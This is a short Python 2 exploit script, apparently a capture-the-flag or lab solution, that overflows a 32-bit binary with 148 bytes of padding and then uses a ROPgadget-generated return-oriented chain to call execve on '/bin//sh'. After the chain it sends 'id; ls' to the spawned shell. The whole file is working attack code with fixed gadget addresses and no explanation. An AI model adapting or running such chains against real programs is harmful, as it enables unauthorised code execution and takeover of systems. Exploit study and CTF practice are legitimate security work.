#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p ="A"*148 

p += pack('<I', 0x0806ee3a) # pop edx ; ret
p += pack('<I', 0x080ea000) # @ .data
p += pack('<I', 0x080b8186) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0805486b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee3a) # pop edx ; ret
p += pack('<I', 0x080ea004) # @ .data + 4
p += pack('<I', 0x080b8186) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0805486b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee3a) # pop edx ; ret
p += pack('<I', 0x080ea008) # @ .data + 8
p += pack('<I', 0x08049493) # xor eax, eax ; ret
p += pack('<I', 0x0805486b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea000) # @ .data
p += pack('<I', 0x080de8ad) # pop ecx ; ret
p += pack('<I', 0x080ea008) # @ .data + 8
p += pack('<I', 0x0806ee3a) # pop edx ; ret
p += pack('<I', 0x080ea008) # @ .data + 8
p += pack('<I', 0x08049493) # xor eax, eax ; ret
p += pack('<I', 0x0807a81f) # inc eax ; ret
p += pack('<I', 0x0807a81f) # inc eax ; ret
p += pack('<I', 0x0807a81f) # inc eax ; ret
p += pack('<I', 0x0807a81f) # inc eax ; ret
p += pack('<I', 0x0807a81f) # inc eax ; ret
p += pack('<I', 0x0807a81f) # inc eax ; ret
p += pack('<I', 0x0807a81f) # inc eax ; ret
p += pack('<I', 0x0807a81f) # inc eax ; ret
p += pack('<I', 0x0807a81f) # inc eax ; ret
p += pack('<I', 0x0807a81f) # inc eax ; ret
p += pack('<I', 0x0807a81f) # inc eax ; ret
p += pack('<I', 0x0806cab5) # int 0x80

p += "\n" * 10000
p += "id; ls\n"
print(p)